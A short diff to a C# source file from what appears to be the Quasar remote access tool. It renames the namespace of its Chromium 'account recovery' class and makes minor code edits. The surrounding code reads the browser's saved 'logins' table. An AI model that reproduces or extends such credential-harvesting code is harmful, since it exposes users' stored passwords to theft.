@@ -1,10 +1,12 @@
-﻿using Quasar.Client.Recovery.Utilities;
+﻿using Everything.Recovery;
+using Everything.Recovery.Utilities;
+using Quasar.Client.Recovery.Browsers;
 using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     /// <summary>
     /// Provides basic account recovery capabilities from chromium-based applications.
@@ -48,7 +50,7 @@ namespace Quasar.Client.Recovery.Browsers
                 if (!sqlDatabase.ReadTable("logins"))
                     return result;
 
-                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                for (var i = 0; i < sqlDatabase.GetRowCount(); i++)
                 {
                     try
                     {
